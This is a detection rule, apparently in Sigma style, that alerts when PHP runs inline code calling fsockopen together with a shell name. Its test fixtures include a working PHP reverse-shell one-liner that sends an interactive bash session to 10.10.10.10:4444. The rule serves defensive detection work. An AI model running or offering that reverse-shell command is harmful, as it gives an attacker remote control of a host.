name: sigma_php_reverse_shell
mode: alert
eval: |
  (
    e.process_executable.contains("/php") && (e.process_args.contains(" -r ") && e.process_args.contains("fsockopen")) && (e.process_args.contains("ash") || e.process_args.contains("bash") || e.process_args.contains("bsh") || e.process_args.contains("csh") || e.process_args.contains("ksh") || e.process_args.contains("pdksh") || e.process_args.contains("sh") || e.process_args.contains("tcsh") || e.process_args.contains("zsh"))
  )
tests:
  - cleartext: "php reverse shell with fsockopen and bash"
    process_name: php
    process_executable: /usr/bin/php
    process_args: "php -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    should_match: true
  - cleartext: "php with fsockopen and sh"
    process_name: php
    process_executable: /usr/bin/php
    process_args: "php -r '$s=fsockopen(\"10.0.0.1\",1234);sh'"
    should_match: true
  - cleartext: "normal php"
    process_name: php
    process_args: "php index.php"
    should_match: false
